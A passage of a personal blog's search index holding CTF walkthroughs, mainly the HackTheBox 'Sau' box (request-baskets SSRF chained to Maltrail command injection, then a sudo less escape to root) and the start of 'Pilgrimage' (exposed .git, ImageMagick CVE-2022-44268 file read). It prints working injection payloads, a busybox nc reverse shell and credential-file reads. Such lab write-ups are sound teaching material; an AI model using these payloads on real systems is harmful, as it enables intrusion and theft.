slashes.\n","date":"2024-02-04T15:20:32-06:00","permalink":"https://yuwenmichael.netlify.app/post/dicectf-2024-qualifier/","title":"DiceCTF 2024 Qualifier"},{"content":"Enumeration Initial nmap:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 Nmap scan report for 10.10.11.224 Host is up (0.036s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA) | 256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA) |_ 256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519) 80/tcp filtered http 8338/tcp filtered unknown 55555/tcp open unknown | fingerprint-strings: | FourOhFourRequest: | HTTP/1.0 400 Bad Request | Content-Type: text/plain; charset=utf-8 | X-Content-Type-Options: nosniff | Date: Fri, 05 Jan 2024 17:53:45 GMT | Content-Length: 75 | invalid basket name; the name does not match pattern: ^[wd-_\\.]{1,250}$ | GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: | HTTP/1.1 400 Bad Request | Content-Type: text/plain; charset=utf-8 | Connection: close | Request | GetRequest: | HTTP/1.0 302 Found | Content-Type: text/html; charset=utf-8 | Location: /web | Date: Fri, 05 Jan 2024 17:53:19 GMT | Content-Length: 27 | href=\u0026#34;/web\u0026#34;\u0026gt;Found\u0026lt;/a\u0026gt;. | HTTPOptions: | HTTP/1.0 200 OK | Allow: GET, OPTIONS | Date: Fri, 05 Jan 2024 17:53:19 GMT |_ Content-Length: 0 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port55555-TCP:V=7.94SVN%I=7%D=1/5%Time=6598420F%P=x86_64-pc-linux-gnu%r SF:(GetRequest,A2,\u0026#34;HTTP/1\\.0\\x20302\\x20Found\\r\\nContent-Type:\\x20text/html SF:;\\x20charset=utf-8\\r\\nLocation:\\x20/web\\r\\nDate:\\x20Fri,\\x2005\\x20Jan\\x SF:202024\\x2017:53:19\\x20GMT\\r\\nContent-Length:\\x2027\\r\\n\\r\\n\u0026lt;a\\x20href=\\\u0026#34; SF:/web\\\u0026#34;\u0026gt;Found\u0026lt;/a\u0026gt;\\.\\n\\n\u0026#34;)%r(GenericLines,67,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20 SF:Request\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection: SF:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request\u0026#34;)%r(HTTPOptions,60,\u0026#34;HTTP/1\\.0\\x2 SF:0200\\x20OK\\r\\nAllow:\\x20GET,\\x20OPTIONS\\r\\nDate:\\x20Fri,\\x2005\\x20Jan\\x SF:202024\\x2017:53:19\\x20GMT\\r\\nContent-Length:\\x200\\r\\n\\r\\n\u0026#34;)%r(RTSPReque SF:st,67,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/plai SF:n;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Reques SF:t\u0026#34;)%r(Help,67,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20t SF:ext/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x SF:20Request\u0026#34;)%r(SSLSessionReq,67,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nC SF:ontent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\ SF:n\\r\\n400\\x20Bad\\x20Request\u0026#34;)%r(TerminalServerCookie,67,\u0026#34;HTTP/1\\.1\\x2040 SF:0\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\ SF:nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request\u0026#34;)%r(TLSSessionReq,67 SF:,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/plain;\\x2 SF:0charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request\u0026#34;)%r SF:(Kerberos,67,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20te SF:xt/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x2 SF:0Request\u0026#34;)%r(FourOhFourRequest,EA,\u0026#34;HTTP/1\\.0\\x20400\\x20Bad\\x20Request\\r SF:\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nX-Content-Type-Optio SF:ns:\\x20nosniff\\r\\nDate:\\x20Fri,\\x2005\\x20Jan\\x202024\\x2017:53:45\\x20GMT SF:\\r\\nContent-Length:\\x2075\\r\\n\\r\\ninvalid\\x20basket\\x20name;\\x20the\\x20n SF:ame\\x20does\\x20not\\x20match\\x20pattern:\\x20\\^\\[\\\\w\\\\d\\\\-_\\\\\\.\\]{1,250}\\ SF:$\\n\u0026#34;)%r(LPDString,67,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Typ SF:e:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x SF:20Bad\\x20Request\u0026#34;)%r(LDAPSearchReq,67,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Reque SF:st\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20c SF:lose\\r\\n\\r\\n400\\x20Bad\\x20Request\u0026#34;); Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 92.13 seconds Ports 80 and 8338 are filtered, which is rather unusual. They could just be closed, or perhaps a firewall is placed and prohibiting interaction with these ports. We can see an unusual open port 55555. Nmap enumeration output is rather confusing, but we can see that this has some http capabilities.\nEnumerating web service on port 55555 Viewing in firefox:\nWe can create baskets, which appear to be url folders. Upon clicking the create button, we receive a token:\nWhen we visit our empty basket, we see instructions on how to use:\nWhen we visit the link, we receive an empty response. Now on our basket page, however, we can see information on the request done:\nOn the main page, we can see that this process is using the opensource project request-baskets:\nTesting SSRF disclosed for request-baskets The version is also detailed as 1.2.1, however the most recent release is v1.2.3. We can explore github release notes to see what was changed between versions, but unfortunately there is not mention of security flaws/vulnerabilities. However, using google to search version 1.2.1 provides us with CVE-2023-27163, an SSRF type vulnerability that can be used to access internal/restricted pages. There are two ideas I have for using this vulnerability. In initial nmap scanning, ports 80 and 8338 were displayed as filtered, perhaps this is something that cannot be accessed externally but can be reached through an SSRF approach. Alternatively, we might access an admin page requiring accessibility we normally don\u0026rsquo;t have. When reaching /web/baskets, it expects us to supply a master token:\nPerhaps with SSRF, a master token would be supplied as a cookie and we can view? It is a possibility worth trying.\nThis article covers the exploit details from an API request perspective, but it is not necessary with our ability to handle the GUI. In my established basket, I can edit this information from the settings cog:\nJust as the article states, we can set the proxy response and expand forward path, and set the forward url to localhost:\nNow when we visit our box, we are forwarded to a the new website on port 80!\nIt looks horrendously broken for now, but the important part is that we are able to access the internal web service despite being behind a firewall.\nFoothold Using SSRF to enumerate the firewalled web service From the webpage footer, we can understand that this service is using Maltrail v0.53:\nA quick google search shows that this service is vulnerable to an OS command injection vulnerability. The provided article lists a very simple payload that we might use:\n1 2 curl \u0026#39;http://hostname:8338/login\u0026#39; \\ --data \u0026#39;username=;`id \u0026gt; /tmp/bbq`\u0026#39; Note that the supplied port is 8338, and we did see this port filtered during our nmap scan. When I check with the SSRF method, the same landing page appears as port 80. It seems that both ports are being used to listen to the same service, so we can use either one.\nTo use this exploit, the first thing we must do is point our SSRF forwarding address at the /login page:\nWhile the request can be sent via firefox, extra steps must be done to transform the request to a POST, and supplying the data. It is easier to do in curl, just as the POC suggests. As for the payload, we shouldn\u0026rsquo;t expect to see the response if we check with id or whoami, as we are not provided with stdout. In order to confirm the RCE is working, we need to send a command that will reach back to our system. My preferred method is to check with a curl or wget request. First, we must set up a listener, either nc or python:\n1 2 ┌──(kali㉿kali)-[~] └─$ nc -lp 80 Next, we send the request to our bucket, with the injected curl command:\n1 2 ┌──(kali㉿kali)-[~] └─$ curl http://10.10.11.224:55555/3gu14de -d \u0026#39;username=;`curl 10.10.14.155`\u0026#39; After a moment of waiting, we can see a request was sent to our listener!\n1 2 3 4 5 6 ┌──(kali㉿kali)-[~] └─$ nc -lp 80 GET / HTTP/1.1 Host: 10.10.14.155 User-Agent: curl/7.68.0 Accept: */* The user-agent is curl as expected, and very importantly the host is 10.10.14.155, our victim\u0026rsquo;s IP.\nChain exploiting request-basket\u0026rsquo;s SSRF and Maltrail\u0026rsquo;s Command Injection for RCE Now to generate a reverse shell. For this, I used the busybox nc payload from revshells:\n1 2 ┌──(kali㉿kali)-[~] └─$ curl http://10.10.11.224:55555/3gu14de -d \u0026#39;username=;`busybox nc 10.10.14.155 8888 -e bash`\u0026#39; Meanwhile on my nc listener:\n1 2 3 4 5 6 ┌──(kali㉿kali)-[~] └─$ nc -nvlp 8888 listening on [any] 8888 ... connect to [10.10.14.155] from (UNKNOWN) [10.10.11.224] 34052 id uid=1001(puma) gid=1001(puma) groups=1001(puma) Privilege Escalation Stabilizing reverse shell Currently, the reverse shell has limited capabilities. We can improve the stability with script:\n1 script -qc /bin/bash /dev/null Afterwards, we must reconfigure stty from our kali terminal. Using ctrl+Z will send the reverse shell to background, were we can configure stty.\n1 2 3 4 5 6 7 8 puma@sau:/opt/maltrail$ ^Z zsh: suspended nc -nvlp 8888 ┌──(kali㉿kali)-[~] └─$ stty raw -echo; fg [1] + continued nc -nvlp 8888 puma@sau:/opt/maltrail$ fg returns the reverse shell to foreground, and now we have a stable, interactive session on the victim host.\nChecking for additional users on the system We can see that we are user puma, and notably user 1001. Since user creations typically start with number 1000, there is likely another created user on the system. We can figure this out by checking /etc/passwd:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 puma@sau:/opt/maltrail$ cat /etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin sshd:x:109:65534::/run/sshd:/usr/sbin/nologin landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:111:1::/var/cache/pollinate:/bin/false fwupd-refresh:x:112:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false puma:x:1001:1001::/home/puma:/bin/bash _laurel:x:997:997::/var/log/laurel:/bin/false Unexpectedly, there is no user with id number 1000. Considering this is an easy difficulty box, the likely conclusion is that lateral movement won\u0026rsquo;t be necessary for completion.\nChecking sudo privileges Enumerating our sudo authorization, we can see our user puma has some command allowances without requiring a password:\n1 2 3 4 5 6 7 puma@sau:/opt/maltrail$ sudo -l Matching Defaults entries for puma on sau: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User puma may run the following commands on sau: (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service This is very good for us, considering we don\u0026rsquo;t know puma\u0026rsquo;s password currently.\nAbusing priveleged less session to spawn a root shell Trying out the command:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 puma@sau:/opt/maltrail$ sudo /usr/bin/systemctl status trail.service WARNING: terminal is not fully functional - (press RETURN)● trail.service - Maltrail. Server of malicious traffic detection system Loaded: loaded (/etc/systemd/system/trail.service; enabled; vendor preset:\u0026gt; Active: active (running) since Fri 2024-01-05 16:49:06 UTC; 2h 0min ago Docs: https://github.com/stamparm/maltrail#readme https://github.com/stamparm/maltrail/wiki Main PID: 895 (python3) Tasks: 62 (limit: 4662) Memory: 80.7M CGroup: /system.slice/trail.service ├─ 895 /usr/bin/python3 server.py ├─ 986 /bin/sh -c logger -p auth.info -t \u0026#34;maltrail[895]\u0026#34; \u0026#34;Failed p\u0026gt; ├─ 989 /bin/sh -c logger -p auth.info -t \u0026#34;maltrail[895]\u0026#34; \u0026#34;Failed p\u0026gt; ├─ 995 sh ├─ 997 python3 -c import socket,os,pty;s=socket.socket(socket.AF_I\u0026gt; ├─ 998 /bin/sh ├─1047 sudo /usr/bin/systemctl status trail.service ├─1049 /usr/bin/systemctl status trail.service ├─1050 pager ├─1052 sh -c /bin/bash ├─1053 /bin/bash ├─1067 /bin/sh -c logger -p auth.info -t \u0026#34;maltrail[895]\u0026#34; \u0026#34;Failed p\u0026gt; ├─1068 /bin/sh -c logger -p auth.info -t \u0026#34;maltrail[895]\u0026#34; \u0026#34;Failed p\u0026gt; ├─1071 sh lines 1-23 We immediately get this terminal not fully functional warning, which is something I instantly recognize. This is common for interactive file viewers such as more or less, when viewed from a reverse shell as we are. These commands are particularly dangerous to run with elevated privileges, as we can often use !bash to open an interactive shell session as the elevated user.\n1 2 3 4 5 6 7 8 puma@sau:/opt/maltrail$ sudo /usr/bin/systemctl status trail.service \u0026lt;...SNIP...\u0026gt; ├─1067 /bin/sh -c logger -p auth.info -t \u0026#34;maltrail[895]\u0026#34; \u0026#34;Failed p\u0026gt; ├─1068 /bin/sh -c logger -p auth.info -t \u0026#34;maltrail[895]\u0026#34; \u0026#34;Failed p\u0026gt; ├─1071 sh lines 1-23!bbaasshh!bash root@sau:/opt/maltrail# id uid=0(root) gid=0(root) groups=0(root) There is some disorienting echoing going on, but when I input the !bash command and hit enter, I am dropped into a root session! With this, we have fully compromised the system.\nAlternative information gathering Finding the usage of less through help menu We can also figure out very easily that the sudo command we are using is indeed utilizing less. By pressing h for help, we are given the summary of less commands:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 \u0026lt;...SNIP...\u0026gt; ├─1068 /bin/sh -c logger -p auth.info -t \u0026#34;maltrail[895]\u0026#34; \u0026#34;Failed p\u0026gt; ├─1071 sh lines 1-23...skipping... SUMMARY OF LESS COMMANDS Commands marked with * may be preceded by a number, N. Notes in parentheses indicate the behavior if N is given. A key preceded by a caret indicates the Ctrl key; thus ^K is ctrl-K. h H Display this help. q :q Q :Q ZZ Exit. --------------------------------------------------------------------------- MOVING e ^E j ^N CR * Forward one line (or N lines). y ^Y k ^K ^P * Backward one line (or N lines). f ^F ^V SPACE * Forward one window (or N lines). b ^B ESC-v * Backward one window (or N lines). z * Forward one window (and set window to N). w * Backward one window (and set window to N). ESC-SPACE * Forward one window, but don\u0026#39;t stop at end-of-file. d ^D * Forward one half-window (and set half-window to N). u ^U * Backward one half-window (and set half-window to N). ESC-) RightArrow * Right one half screen width (or N positions). HELP -- Press RETURN for more, or q when done Using GTFOBins to discover how to abuse less or systemctl If we happen to be unfamiliar with this form of less escape, we can refer to gtfobins. Additionally if we had trouble recognizing less, gtfobins also mentions it on systemctl\u0026rsquo;s page\n","date":"2024-01-06T10:32:21-06:00","image":"https://yuwenmichael.netlify.app/post/hackthebox-sau/Sau_hu395bd5edbfd24d434ffdbc0f1375eb9f_446175_120x120_fill_box_smart1_3.png","permalink":"https://yuwenmichael.netlify.app/post/hackthebox-sau/","title":"HackTheBox - Sau"},{"content":"Foothold Initial nmap:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 Nmap scan report for 10.10.11.219 Host is up (0.056s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) | ssh-hostkey: | 3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3 (RSA) | 256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af (ECDSA) |_ 256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04 (ED25519) 80/tcp open http nginx 1.18.0 |_http-server-header: nginx/1.18.0 |_http-title: Did not follow redirect to http://pilgrimage.htb/ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 9.41 seconds The only ports available are 22 and 80. Since 22 is related to ssh connection which requires valid credentials, we can start by checking port 80. Nmap shows us that visiting the website on port 80 results in a redirect to http://pilgrimage.htb. We can begin by adding this entry into our /etc/hosts file:\n1 2 3 4 5 6 7 8 9 ┌──(kali㉿kali)-[~/Documents/Pilgrimage] └─$ cat /etc/hosts 127.0.0.1 localhost 127.0.1.1 kali ::1 localhost ip6-localhost ip6-loopback ff02::1 ip6-allnodes ff02::2 ip6-allrouters 10.10.11.219 pilgrimage.htb Enumerating Web Service Visiting the page, we can see it is an image shrinker. We are given the option to upload images, and the files will be presumable compressed and returned to us.\nWhen submitting a sample png, we find that it is saved in /shrunk/ under an altered name:\nTrying to upload a non-image file results in a fail message:\nWhen enumerating directories with feroxbuster, we might find an interesting folder named tmp.\n1 2 3 4 5 6 7 8 9 10 ┌──(kali㉿kali)-[~/Documents/Pilgrimage] └─$ feroxbuster -u http://pilgrimage.htb/ ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \u0026#34;epi\u0026#34; Risher 🤓 ver: 2.10.0 \u0026lt;...SNIP...\u0026gt; 301 GET 7l 11w 169c http://pilgrimage.htb/tmp =\u0026gt; http://pilgrimage.htb/tmp/ \u0026lt;...SNIP...\u0026gt; From this, we might get an idea of how this process is being done. First, uploaded files are placed in /tmp/, a compression operation is performed and saved to /shrunk/, and the link is sent back to us. There is a possibility that this allows for a race condition, where we might upload a php script, have it saved in /tmp/ and execute the script before the shrinking operation is done and the file is cleaned up. Unfortunately, this does not work presumably because the uploaded files are being renamed using some method we don\u0026rsquo;t know.\nDiscovery of git filesystem If we return to nmap after adding our /etc/hosts entry, we might see interesting new information:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 Nmap scan report for pilgrimage.htb (10.10.11.219) Host is up (0.054s latency). PORT STATE SERVICE VERSION 80/tcp open http nginx 1.18.0 | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: nginx/1.18.0 |_http-title: Pilgrimage - Shrink Your Images | http-git: | 10.10.11.219:80/.git/ | Git repository found! | Repository description: Unnamed repository; edit this file \u0026#39;description\u0026#39; to name the... |_ Last commit message: Pilgrimage image shrinking service initial commit. # Please ... Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 8.97 seconds Nmap can identify a .git repository, and this can be done manually as well, with a curl:\n1 2 3 ┌──(kali㉿kali)-[~] └─$ curl http://pilgrimage.htb/.git/HEAD ref: refs/heads/master This check is not included in may directory brute-forcing wordlists, so it might be easy to miss. Regardless, now that we know, we can retrieve all contents using git-dumper.\n1 2 3 4 5 6 ┌──(kali㉿kali)-[~/Documents/Pilgrimage] └─$ python gitdumper.py http://pilgrimage.htb ./repo [-] Testing http://pilgrimage.htb/.git/HEAD [200] [-] Testing http://pilgrimage.htb/.git/ [403] [-] Fetching common files \u0026lt;...SNIP...\u0026gt; Now with the entire repo gathered with git-dumper, we can view the git logs:\n1 2 3 4 5 6 7 ┌──(kali㉿kali)-[~/Documents/Pilgrimage/repo] └─$ git log commit e1a40beebc7035212efdcb15476f9c994e3634a7 (HEAD -\u0026gt; master) Author: emily \u0026lt;emily@pilgrimage.htb\u0026gt; Date: Wed Jun 7 20:11:48 2023 +1000 Pilgrimage image shrinking service initial commit. We have a username emily, but there aren\u0026rsquo;t extra commits to sift through. However, we have the entire web server files available to us now:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 ┌──(kali㉿kali)-[~/Documents/Pilgrimage/repo] └─$ ls -al total 26972 drwxr-xr-x 5 kali kali 4096 Nov 19 15:17 . drwxr-xr-x 3 kali kali 4096 Nov 19 15:13 .. drwxr-xr-x 6 kali kali 4096 Nov 19 15:14 assets -rwxr-xr-x 1 kali kali 5538 Nov 19 15:14 dashboard.php drwxr-xr-x 7 kali kali 4096 Nov 19 15:14 .git -rwxr-xr-x 1 kali kali 9250 Nov 19 15:14 index.php -rwxr-xr-x 1 kali kali 6822 Nov 19 15:14 login.php -rwxr-xr-x 1 kali kali 98 Nov 19 15:14 logout.php -rwxr-xr-x 1 kali kali 27555008 Nov 19 15:14 magick -rwxr-xr-x 1 kali kali 6836 Nov 19 15:14 register.php drwxr-xr-x 4 kali kali 4096 Nov 19 15:14 vendor Foothold File Read via ImageMagick On the index page, we can see the upload checks being done, and what is done to compress:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 if ($_SERVER[\u0026#39;REQUEST_METHOD\u0026#39;] === \u0026#39;POST\u0026#39;) { $image = new Bulletproof\\Image($_FILES); if($image[\u0026#34;toConvert\u0026#34;]) { $image-\u0026gt;setLocation(\u0026#34;/var/www/pilgrimage.htb/tmp\u0026#34;); $image-\u0026gt;setSize(100, 4000000); $image-\u0026gt;setMime(array(\u0026#39;png\u0026#39;,\u0026#39;jpeg\u0026#39;)); $upload = $image-\u0026gt;upload(); if($upload) { $mime = \u0026#34;.png\u0026#34;; $imagePath = $upload-\u0026gt;getFullPath(); if(mime_content_type($imagePath) === \u0026#34;image/jpeg\u0026#34;) { $mime = \u0026#34;.jpeg\u0026#34;; } $newname = uniqid(); exec(\u0026#34;/var/www/pilgrimage.htb/magick convert /var/www/pilgrimage.htb/tmp/\u0026#34; . $upload-\u0026gt;getName() . $mime . \u0026#34; -resize 50% /var/www/pilgrimage.htb/shrunk/\u0026#34; . $newname . $mime); unlink($upload-\u0026gt;getFullPath()); $upload_path = \u0026#34;http://pilgrimage.htb/shrunk/\u0026#34; . $newname . $mime; if(isset($_SESSION[\u0026#39;user\u0026#39;])) { $db = new PDO(\u0026#39;sqlite:/var/db/pilgrimage\u0026#39;); $stmt = $db-\u0026gt;prepare(\u0026#34;INSERT INTO `images` (url,original,username) VALUES (?,?,?)\u0026#34;); $stmt-\u0026gt;execute(array($upload_path,$_FILES[\u0026#34;toConvert\u0026#34;][\u0026#34;name\u0026#34;],$_SESSION[\u0026#39;user\u0026#39;])); } header(\u0026#34;Location: /?message=\u0026#34; . $upload_path . \u0026#34;\u0026amp;status=success\u0026#34;); We can see it is using magick to convert, presumably imagemagick. The file is located in the webroot, meaning we have it now as well thanks to git-dumper. Alternatively, it could be downloaded directly from http://pilgrimage.htb/magick\n1 2 3 4 5 ┌──(kali㉿kali)-[~/Documents/Pilgrimage/repo] └─$ curl http://pilgrimage.htb/magick Warning: Binary output can mess up your terminal. Use \u0026#34;--output -\u0026#34; to tell Warning: curl to output it to your terminal anyway, or consider \u0026#34;--output Warning: \u0026lt;FILE\u0026gt;\u0026#34; to save to a file. We can easily check the version number with -version:\n1 2 3 4 5 6 7 8 ┌──(kali㉿kali)-[~/Documents/Pilgrimage/repo] └─$ ./magick -version Version: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 https://imagemagick.org Copyright: (C) 1999 ImageMagick Studio LLC License: https://imagemagick.org/script/license.php Features: Cipher DPC HDRI OpenMP(4.5) Delegates (built-in): bzlib djvu fontconfig freetype jbig jng jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib Compiler: gcc (7.5) ImageMagick has recently disclosed a vulnerability CVE-2022-44268, which might disclose sensitive files with it\u0026rsquo;s image processing. The general idea is this: we send a malicious png pointing to a particular file we want to acquire, and submit it to the shrinker. ImageMagick will process the file and, if the executing user can read it, will append the target file contents to our shrinked image. We can use this proof of concept to generate our malicious png files and read the output contents.\n1 2 3 4 5 6 7 8 9 10 ┌──(kali㉿kali)-[~/Documents/Pilgrimage] └─$ pngcrush -text a \u0026#34;profile\u0026#34; \u0026#34;/etc/hosts\u0026#34; sample.png Recompressing IDAT chunks in sample.png to pngout.png Total length of data found in critical chunks = 2206 Best pngcrush method = 4 (ws 15 fm 0 zl 9 zs 1) = 1201 CPU time decode 0.001745, encode 0.006729, other 0.000800, total 0.010875 sec ┌──(kali㉿kali)-[~/Documents/Pilgrimage] └─$ ls gitdumper.py pngout.png repo sample.png The file is saved as pngout.png. Uploading the file:\nTo save the file, we can curl again, or visit the page in browser and select \u0026ldquo;Save As\u0026rdquo;. Retrieving the data hex:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 ┌──(kali㉿kali)-[~/Documents/Pilgrimage] └─$ identify -verbose 655a702e292d2.png Image: 655a702e292d2.png Format: PNG (Portable Network Graphics) \u0026lt;...SNIP...\u0026gt; Raw profile type: 205 3132372e302e302e31096c6f63616c686f73740a3132372e302e312e310970696c677269 6d6167652070696c6772696d6167652e6874620a0a232054686520666f6c6c6f77696e67 206c696e65732061726520646573697261626c6520666f7220495076362063617061626c 6520686f7374730a3a3a3120202020206c6f63616c686f7374206970362d6c6f63616c68 6f7374206970362d6c6f6f706261636b0a666630323a3a31206970362d616c6c6e6f6465 730a666630323a3a32206970362d616c6c726f75746572730a \u0026lt;...SNIP...\u0026gt; 205 is related to the hex length, and the numbers following is the hex output. Using Cyberchef to convert the output:\nWe can use this to grab the /etc/passwd as well:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:109::/nonexistent:/usr/sbin/nologin systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin emily:x:1000:1000:emily,,,:/home/emily:/bin/bash systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin sshd:x:105:65534::/run/sshd:/usr/sbin/nologin _laurel:x:998:998::/var/log/laurel:/bin/false emily is a confirmed user, and the only user account created on this system. With the source code acquired from git-dumper, we know where the sqlite database is located. It is unlikely to be delivered well, but we might be able to find credentials in there. From register.php:\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;?php session_start(); if(isset($_SESSION[\u0026#39;user\u0026#39;])) { header(\u0026#34;Location: /dashboard.php\u0026#34;); exit(0); } if 